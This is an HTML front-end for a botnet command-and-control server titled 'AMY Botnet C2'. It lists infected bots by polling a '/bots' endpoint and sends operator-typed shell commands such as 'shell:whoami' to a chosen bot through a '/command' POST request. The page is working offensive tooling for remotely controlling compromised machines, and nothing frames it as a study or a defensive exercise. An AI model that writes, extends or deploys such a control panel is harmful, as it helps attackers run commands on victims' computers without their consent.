<!DOCTYPE html>
<html lang="uk">

<head>
    <meta charset="UTF-8">
    <title>AMY Botnet C2</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        .terminal {
            background: #0a0a0a;
            font-family: 'Courier New', monospace;
            color: #00ff41;
            height: 460px;
            overflow-y: auto;
            padding: 16px;
            border: 1px solid #450a0a;
        }
    </style>
</head>

<body class="bg-zinc-950 text-red-400 p-8 font-mono">
    <h1 class="text-5xl font-bold mb-8 text-red-600">AMY BOTNET C2</h1>

    <div class="grid grid-cols-2 gap-8">
        <div>
            <h2 class="text-2xl mb-4">Active Bots (<span id="count" class="text-red-500">0</span>)</h2>
            <div id="botlist" class="space-y-3"></div>
        </div>

        <div>
            <h2 class="text-2xl mb-4">Control</h2>
            <input id="botid" placeholder="Bot ID" class="bg-zinc-900 p-4 w-full mb-4 rounded">
            <input id="command" placeholder="shell:whoami" class="bg-zinc-900 p-4 w-full mb-4 rounded">
            <button onclick="sendCmd()" class="bg-red-600 w-full py-5 rounded font-bold">EXECUTE</button>
        </div>
    </div>

    <script>
        async function updateBots() {
            const res = await fetch('/bots');
            const data = await res.json();
            document.getElementById('count').textContent = data.bots.length;
            let html = '';
            data.bots.forEach(id => {
                html += `<div class="bg-zinc-900 p-4 rounded">${id}</div>`;
            });
            document.getElementById('botlist').innerHTML = html;
        }
        function sendCmd() {
            const bot = document.getElementById('botid').value;
            const cmd = document.getElementById('command').value;
            fetch(`/command?bot_id=${bot}&command=${encodeURIComponent(cmd)}`, { method: 'POST' });
        }
        setInterval(updateBots, 3000);
        updateBots();
    </script>
</body>

</html>
